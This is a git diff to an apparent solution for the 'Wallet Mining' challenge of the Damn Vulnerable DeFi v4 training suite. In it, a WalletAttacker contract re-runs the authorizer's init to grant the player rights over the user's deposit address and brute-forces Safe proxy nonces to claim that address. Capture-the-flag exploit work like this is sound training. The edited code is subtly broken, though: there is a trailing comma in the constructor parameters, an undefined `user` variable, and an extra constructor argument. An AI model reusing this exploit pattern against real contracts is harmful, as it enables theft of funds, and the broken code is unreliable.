@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: MIT
+    // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
@@ -35,6 +35,7 @@ import {
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
 
+
 contract WalletAttacker {
     DamnValuableToken token;
     AuthorizerUpgradeable authorizer;
@@ -50,7 +51,7 @@ contract WalletAttacker {
         DamnValuableToken _token,
         WalletDeployer _walletDeployer,
         SafeProxyFactory _proxyFactory,
-        Safe _singletonCopy
+        Safe _singletonCopy,
     ) {
         authorizer = _authorizer;
         token = _token;
@@ -59,22 +60,38 @@ contract WalletAttacker {
         singletonCopy = _singletonCopy;
     }
 
-    function attack() external {
+    function attack(address player, address user) external {
         address[] memory newWards = new address[](1);
         newWards[0] = player;
         address[] memory newAims = new address[](1);
         newAims[0] = USER_DEPOSIT_ADDRESS;
 
         AuthorizerUpgradeable(address(authorizer)).init(newWards, newAims);
+        findNonce(user);
     }
 
-    function findNonce() external {
+    function findNonce(address _user) internal {
         bytes memory deploymentData = abi.encodePacked(
             proxyFactory.proxyCreationCode(), // type(SafeProxy).creationCode
             uint256(uint160(address(singletonCopy))) // _singleton cast to uint256
         );
 
         bytes32 deploymentHash = keccak256(deploymentData);
+
+        address[] memory owners = new address[](1);
+        owners[0] = user; // the wallet owner
+
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector,
+            owners,        // _owners
+            1,             // _threshold — 1 of 1
+            address(0),    // to — no delegatecall during setup
+            "",            // data — empty
+            address(0),    // fallbackHandler
+            address(0),    // paymentToken
+            0,             // payment
+            address(0)     // paymentReceiver
+        );
 
         for (uint256 nonce = 0; nonce < 1000; nonce++) {
             bytes32 salt = keccak256(
@@ -272,9 +289,10 @@ contract WalletMiningChallenge is Test {
             DamnValuableToken(token),
             WalletDeployer(walletDeployer),
             SafeProxyFactory(proxyFactory),
-            Safe(singleCopy)
+            Safe(singletonCopy),
+            address(deployer)
         );
-        attacker.attack();
+        attacker.attack(address(player),address(user));
     }
 
     /**
